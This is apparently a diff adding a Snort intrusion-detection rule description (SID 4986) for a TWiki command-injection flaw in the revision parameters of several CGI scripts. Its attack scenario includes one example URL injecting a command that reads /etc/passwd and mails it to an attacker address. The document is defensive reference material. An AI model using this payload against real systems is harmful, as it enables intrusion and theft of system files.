@@ -1,0 +1,61 @@
+Rule: 
+
+--
+Sid: 
+4986
+
+-- 
+Summary: 
+This event is generated when an attempt is made to exploit a known vulnerability in an implementation of the Twiki web application.
+
+-- 
+Impact: 
+Serious. Possible code and system command execution.
+
+--
+Detailed Information:
+Twiki is a web based collaboration application that can be used as a collective knowlege base, project management tool or document sharing system.
+
+A vulnerability exists in the Twiki server due to insufficient sanitization of user supplied values to the revision parameter or certain CGI scripts, enabling execution of arbitrary shell commands.
+
+Specifically, for the scripts "view", "rdiff", and "viewfile", a revision parameter may be supplied a value.  The revision parameter may be "rev", "rev1", or "rev2".  No sanitization is performed on supplied values to these parameters, permitting command injection.  The values supplied to these parameters should be either a digit or ".".
+
+--
+Affected Systems:
+TWiki TWiki 20040902
+TWiki TWiki 20040901
+TWiki TWiki 20030201
+TWiki TWiki 01-Dec-2001
+
+--
+Attack Scenarios: 
+An attacker could supply commands of their choosing to the parameters of the vulnerable scripts which would be executed in the context of the user running the Twiki application.
+
+Example: http://www.victim.com/cgi/view/Twiki?rev=2%60cat%20/etc/passwd%7cmail%20badguy@attacker.com
+
+-- 
+Ease of Attack: 
+Simple. Exploit software not required.
+
+-- 
+False Positives:
+None Known
+
+--
+False Negatives:
+None Known
+
+-- 
+Corrective Action: 
+Upgrade to the latest non-affected version of the software.
+
+--
+Contributors: 
+Sourcefire Vulnerability Research Team
+Judy Novak <judy.novak@sourcefire.com>
+Nigel Houghton <nigel.houghton@sourcefire.com>
+
+-- 
+Additional References:
+
+--
